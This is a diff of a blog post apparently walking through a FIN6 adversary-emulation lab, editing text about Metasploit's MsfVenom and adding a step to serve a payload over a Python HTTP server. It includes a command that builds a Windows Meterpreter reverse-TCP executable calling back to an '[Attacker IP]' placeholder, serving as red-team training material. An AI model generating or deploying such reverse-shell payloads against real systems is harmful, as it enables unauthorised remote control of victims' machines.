@@ -28,7 +28,7 @@ One single tool
 Standardized command line options
 Increased speed
 
-Msfvenom has a wide range of options available:
+_MsfVenom_ has a wide range of options available:
 
 ![]({{site.baseurl}}/assets/img/2023-08-02-FIN6 Adversary Emulation - Phase 1/2023-08-02-Metasploit_MsfVenom.png){:width="100%"}
 
@@ -46,7 +46,7 @@ To see what payloads are available from Framework, you can do:
 ./msfvenom -l payloads
 ```
 
-Below is the typical syntax to use msfvenom:
+Below is the typical syntax to use _MsfVenom_:
 
 ```bash
 msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=[Attacker IP] lport=4444 -f exe -o /tmp/my_payload.exe
@@ -87,15 +87,23 @@ Aside from, we can also see that LHOST needs to be set. We don’t need to set L
 We can set the LHOST option with the following command:
 
 ```bash
-set LHOST <attackerVM_ip_address>
+set LHOST [Attacker IP]
 ```
 
 Once done, you should now have a similar configuration on the screenshot below.
 
 ![]({{site.baseurl}}/assets/img/2023-08-02-FIN6 Adversary Emulation - Phase 1/2023-08-02-Metasploit_MsfConsole_Final_Show_Options.png){:width="100%"}
 
-Next
 
+### 1.4 - Transer Payload via Server
+
+Next we need to set up an HTTP server to transer the _MsfVenom_ payload that we have created earlir. 
+
+To to this, Open another terminal tab then start a Python3 HTTP server on port 80:
+
+```bash
+sudo python3 -m http.server 80
+```
 
 ## Step 2 - FIN6 Discovery
 
